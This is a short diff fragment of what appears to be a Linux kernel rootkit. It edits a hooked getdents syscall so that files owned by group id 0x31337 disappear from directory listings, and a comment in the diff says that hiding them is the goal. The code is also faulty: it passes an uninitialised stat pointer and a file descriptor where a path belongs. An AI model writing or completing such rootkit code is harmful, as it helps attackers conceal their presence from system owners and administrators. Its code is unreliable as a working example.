@@ -121,8 +121,9 @@ asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned
             d->d_off=(nd->d_off+d->d_off);
             d->d_reclen=(d->d_reclen+nd->d_reclen);
         }
+        //want to somehow get the gid of the current dirent. if == 0x31337 then hide
         struct stat *getstat;
-        stat(d->d_name,getstat);
+        stat(fd,getstat);
         if (getstat->st_gid == 0x31337) {
             d->d_off=(nd->d_off+d->d_off);
             d->d_reclen=(d->d_reclen+nd->d_reclen);
